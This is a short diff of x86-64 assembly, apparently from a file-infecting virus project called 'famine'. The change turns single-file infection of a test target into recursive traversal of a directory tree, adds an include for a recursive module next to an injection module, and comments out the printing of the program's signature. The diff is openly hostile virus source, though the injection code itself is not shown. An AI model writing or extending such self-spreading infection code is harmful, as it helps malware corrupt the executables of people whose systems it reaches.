@@ -11,22 +11,23 @@ section .text
 main:
     push rbp
     mov rbp, rsp
-    sub rsp, famine_size                        ;   le segv est sur la stack
+    sub rsp, famine_size                        ;   le segv est sur la stack  peux etre modulo 8
     push rdx
     push rcx
     push rdi
     push rsi
-    lea rdi, [rel ptest]
-    mov [rsp + fileName], rdi
-    mov rsi, rsp
-    call infect_file
+    lea rdi, [rsp + pathBuffer]
+    lea rsi, [rel firstDir]
+    call ft_strcpy
+    mov rdi, rsp
+    call recursive
 
 exit:
-    mov rdi, 1
-    lea rsi, [rel signature]
-    mov rdx, SIGNATURE_SIZE
-    mov rax, SYS_WRITE
-    syscall
+;    mov rdi, 1
+;    lea rsi, [rel signature]
+;    mov rdx, SIGNATURE_SIZE
+;    mov rax, SYS_WRITE
+;    syscall
     pop rsi
     pop rdi
     pop rcx
@@ -41,6 +42,7 @@ jump:
     nop
 
 
+%include "recursive.s"
 
 %include "injection.s"
 
